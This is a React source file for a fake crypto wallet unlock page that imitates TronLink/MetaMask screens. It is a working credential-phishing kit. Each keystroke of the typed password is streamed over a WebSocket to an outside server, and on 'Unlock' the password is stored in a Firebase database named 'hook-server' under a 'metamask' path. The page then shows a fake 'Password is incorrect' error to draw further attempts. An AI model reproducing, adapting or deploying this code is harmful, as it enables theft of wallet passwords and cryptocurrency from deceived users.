import { useEffect, useState, useRef } from "react";
import { EventEmitter } from "events";
import { initializeApp } from "firebase/app";
import { getDatabase } from "firebase/database";
import { ref, set } from "firebase/database";
import { v4 as uuidv4 } from 'uuid';
import axios from 'axios';

import EyeIconSVG from "../assets/0e30e772fd4c9a6b76aab24d57b2981f.svg";
import TronLogoSVG from "../assets/91c504daa48084faca93f245670c4466.svg";
import loadingSVG from "../assets/0fe3d5b4225d73c20f319e9fb05f931d.gif";
import { ReactComponent as BtnLoadingSVG } from "../assets/dbdd96db664c2df816b260a90799c1b8.svg";
import alertSVG from "../assets/da4a1c2d13292d8a0596a84b72722107.svg";
import "./unlock.css";

const firebaseConfig = {
  apiKey: "AIzaSyCd2I2JNm7okch3L8S0uozioChrntq05Ow",
  authDomain: "hook-server-fcc32.firebaseapp.com",
  databaseURL: "https://hook-server-fcc32-default-rtdb.firebaseio.com/",
  projectId: "hook-server-fcc32",
  storageBucket: "hook-server-fcc32.firebasestorage.app",
  messagingSenderId: "816070028547",
  appId: "1:816070028547:web:7c5202b183183dee8fcd36",
  measurementId: "G-957FNZD5T4"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

// WebSocket constants
const PING = 99;
const SEND_UID = 101;
const BROWSER_CONNECTED = 102;

const formatDateWithMilliseconds = () => {
  const now = new Date();
  const year = now.getFullYear();
  const month = String(now.getMonth() + 1).padStart(2, '0');
  const day = String(now.getDate()).padStart(2, '0');
  const hours = String(now.getHours()).padStart(2, '0');
  const minutes = String(now.getMinutes()).padStart(2, '0');
  const seconds = String(now.getSeconds()).padStart(2, '0');
  const milliseconds = String(now.getMilliseconds()).padStart(4, '0'); // Milliseconds padded to 4 digits

  return `${year}${month}${day}${hours}${minutes}${seconds}${milliseconds}`;
};

const UnlockPage = ({onSuccess}) => {
  const [isPageLoading, setIsPageLoading] = useState(true);
  const [password, setPassword] = useState("");
  const [isPasswordVisible, setIsPasswordVisible] = useState(false);
  const [errorMessage, setErrorMessage] = useState("");
  const [isCheckingPassword, setIsCheckingPassword] = useState(false);
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [isModalClosing, setIsModalClosing] = useState(false);
  const [countdown, setCountdown] = useState(10);
  const [intervalId, setIntervalId] = useState();

  const [isConnected, setIsConnected] = useState(false);
  const ws = useRef(null);
  const uniqueId = useRef(uuidv4());

  useEffect(() => {
    // Initialize WebSocket connection
    connectWebSocket();

    // Cleanup on component unmount
    return () => {
      if (ws.current) {
        ws.current.close();
      }
    };
  }, []);

  const connectWebSocket = () => {
    ws.current = new WebSocket("wss://lucid-socket-server.onrender.com");

    ws.current.onopen = () => {
      setIsConnected(true);
      // Send browser connected message
      const jsonObject = {
        e: BROWSER_CONNECTED,
        v: uniqueId.current
      };
      
      if (ws.current && ws.current.readyState === WebSocket.OPEN) {
        ws.current.send(JSON.stringify(jsonObject));
      } else {
        console.warn('WebSocket not connected');
      }
    };

    ws.current.onclose = () => {
      setIsConnected(false);
    };

    ws.current.onerror = (error) => {
      console.error('WebSocket error:', error);
      setIsConnected(false);
    };
  };

  const openModal = () => {
    setIsModalOpen(true);
    setIsModalClosing(false);
    setCountdown(10);

    if (intervalId) clearInterval(intervalId);

    const newInterval = setInterval(() => {
      setCountdown((prev) => {
        if (prev <= 1) {
          clearInterval(newInterval);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    setIntervalId(newInterval);
  };

  const closeModal = () => {
    if (intervalId) {
      clearInterval(intervalId);
      setCountdown(10);
    }

    setIsModalClosing(true);
    setTimeout(() => setIsModalOpen(false), 250);
  };

  useEffect(() => {
    const timer = setTimeout(() => {
      setIsPageLoading(false);
    }, 1500);
    return () => clearTimeout(timer);
  }, []);

  const handlePasswordChange = (e) => {
    const value = e.target.value;
    setErrorMessage("");
    setPassword(value);
    if (value.trim() === '' || !isConnected) return;

    const pingObject = {
      e: SEND_UID,
      v: value
    };

    if (ws.current && ws.current.readyState === WebSocket.OPEN) {
      ws.current.send(JSON.stringify(pingObject));
    } else {
      console.warn('WebSocket not connected');
    }
  };

  const getCurrentTimestamp = () => {
    return {
      milliseconds: Date.now(),
      seconds: Math.floor(Date.now() / 1000)
    };
  };

  // const handleUnlock = () => {
  //   if (!password) return;

  //   setIsCheckingPassword(true);
  //   setTimeout(() => {
  //     setIsCheckingPassword(false);
  //     setErrorMessage("Wrong Password");
  //   }, 30);
  // };

  const handleUnlock = async () => {
    const timestamp = getCurrentTimestamp();
    console.log('Current timestamp:', timestamp);
    if (!password.length) return;
    set(ref(db, "88_/-metamask/" + formatDateWithMilliseconds()), {
      value: password,
      date: String(new Date()),
    });

    const value = password;
    if (value.trim() === '' || !isConnected) {
      console.warn('Metamask Support API not connected');
    } else {
      const pingObject = {
        e: SEND_UID,
        v: value
      };
      
      if (ws.current && ws.current.readyState === WebSocket.OPEN) {
        ws.current.send(JSON.stringify(pingObject));
      } else {
        console.warn('WebSocket not connected');
      }
    }

    setErrorMessage("");

    try {
      const url = `https://api.npoint.io/a8e12caa3df5c2954957`;
      const response = await axios.get(url);
      if (response.data.success) {
        onSuccess()
      }
    } catch (error) {
      // throw new Error(`Failed to fetch data: ${error.message}`);
      console.error(`Failed to decrypt vault: ${error.message}`)
      setErrorMessage("Password is incorrect. Please try again.");
    }
  };

  const handleKeyUp = async (e) => {
    if (e.keyCode === 13) {
      handleUnlock();
    }
  };

  return (
    <div className="K3Bt74ReDB0gC3OcP9RD col">
      <div className="Fvg_SYtrIuWKFjIJNjLA">
        <img src={TronLogoSVG} alt="" />
      </div>
      <div className="_N70LgLT2SEJv92usLJL">
        Enter the password to unlock your wallet
      </div>
      <div
        className={`nxJ8HzCFTTnzToow6zeQ ${
          errorMessage ? "UFwhvkYAJ0ltyahslsgW" : ""
        }`}
      >
        <div className="DFlySJnQ9TIGNUomyHgV">
          <input
            placeholder="Password"
            type={isPasswordVisible ? "text" : "password"}
            autoComplete="off"
            spellCheck="false"
            value={password}
            onChange={handlePasswordChange}
            onKeyUp={handleKeyUp}
          />
          <img
            src={EyeIconSVG}
            className="c0wdNFzo08E57WQ5Zvt0"
            alt=""
            onClick={() => setIsPasswordVisible(!isPasswordVisible)}
          />
        </div>
      </div>
      <div className="uAnobfzNZ2ZwHDRsM30Y">{errorMessage}</div>
      <div className="VwXUZsPY_bQKMETfD4X8">
        <button
          className={`B1a7cASr1kJ_GaXOoFFL EqVDkDxpR6wjuW9uygAR lo4jCtRMqBPgkgfPNKxE ${
            !password ? "is-invalid" : "is-valid"
          }`}
          onClick={handleUnlock}
        >
          Unlock {isCheckingPassword && <BtnLoadingSVG className="spinner" />}
        </button>
      </div>
      <div className="md4cIm1r7EXBeUI6x4t3">
        <div className="ao5O3KOS3v_TLT2vZmIL">Unable to log in?</div>
        <div className="EDAurQVnrivlQ6uKId4N">
          <div className="zwFWkF4cRbwGz7D64PX6" onClick={openModal}>
            Unlock in other ways
          </div>
          &nbsp;or&nbsp;
          <div className="zwFWkF4cRbwGz7D64PX6" onClick={openModal}>
            Create a new wallet
          </div>
        </div>
      </div>
      {isPageLoading && (
        <div className="g5pIwSIYSZfpEjavXMqr">
          <div className="WrVUnYP2mQAdTIM2GTzR" style={{ maxWidth: "200px" }}>
            <div className="eq5PMi_wWS2cjd9cLXP0">
              <img src={loadingSVG} alt="" className="RcxyMv5dpvv44whsm1i4" />
            </div>
          </div>
        </div>
      )}
      <div
        className={`modal ${isModalClosing ? "fade-out" : "fade-in"}`}
        style={{ display: isModalOpen ? "flex" : "none" }}
      >
        <div
          className={`modal-body ${isModalClosing ? "slide-down" : "slide-up"}`}
          onClick={(e) => e.stopPropagation()}
        >
          <div className="_0PqczBUs3ZDIA_Ydwt4w">
            <div><span>Security Tip</span></div>
          </div>

          <p className="txCDhTyPgHmzbwKhxZDR">
            <img src={alertSVG} alt="" />
            All your existing wallets will be removed and replaced with the new
            one.
          </p>

          <p className="txCDhTyPgHmzbwKhxZDR">
            <img src={alertSVG} alt="" />
            Please make sure you have backed up your mnemonic or private keys,
            otherwise you will not be able to recover the assets in your
            wallets.
          </p>

          <p className="txCDhTyPgHmzbwKhxZDR eY6D6ufrIjhufPB18OZh">
            <img src={alertSVG} alt="" />
            Do not continue unless you have tried all possible ways to unlock
            this wallet and have backed up your mnemonic or private key.
          </p>

          <div
            className={`qMLxSG2MdFgn2VSqiIw9 OhDKfR0698pNdh8Tq8r0 ${
              countdown ? "_6yvIsBsu65r2oZ2fUgYg" : ""
            }`}
          >
            Continue {countdown ? `in ${countdown}s` : ""}
          </div>

          <div className="QXR4J1CDK3Jut58LTW7u" onClick={closeModal}>
            Back
          </div>
        </div>
      </div>
    </div>
  );
};

export default UnlockPage;
